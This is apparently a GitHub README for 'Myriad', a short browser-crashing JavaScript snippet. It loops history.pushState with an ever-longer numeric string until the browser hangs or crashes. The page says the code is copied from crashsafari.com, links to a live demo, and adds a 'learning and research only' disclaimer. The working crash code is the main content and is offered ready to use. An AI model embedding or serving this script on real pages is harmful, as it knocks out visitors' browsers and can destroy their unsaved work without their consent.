# Myriad

Simple JS script that overloads the browser with a huge URL (Where it gets its name)

## The code

The code is super simple!

The code exploits the [HTML5 pushState](https://developer.mozilla.org/en-US/docs/Web/API/History_API) API used on all modern browsers to update the path of the site you are visiting during JavaScript page navigation.

Instead of just changing the path from `website.com/pageone` to `website.com/pagetwo` it creates a string of numbers long enough to slow the browser until it won't function, hang, or crash.

```js
var total = "";
for( var i = 0; i < 10000000000000; i++ ) {
total += i.toString();
history.pushState(0,0, total );
}
```

## Need for Myriad

No one is ever gonna need it (To Say Nothing Of The Naughty Ones)

This script is in the mischievous websites like [crashsafari.com](https://crashsafari.com), [crashchrome.com](http://crashchrome.com), etc.

You better don't do so!

Original code taken from [crashsafari.com](http://crashsafari.com)

## Demo

Visit [this](https://fuk.netlify.app) link **ON YOUR OWN RISK**. I am not responsible for any harm due to this page...... warned ya!

## Disclaimer

* This piece of code is open and I am not the creator or owner of this script.
* It is only for learning and research purpose.
* I am not responsible for any destruction or harm caused due to this program/code.
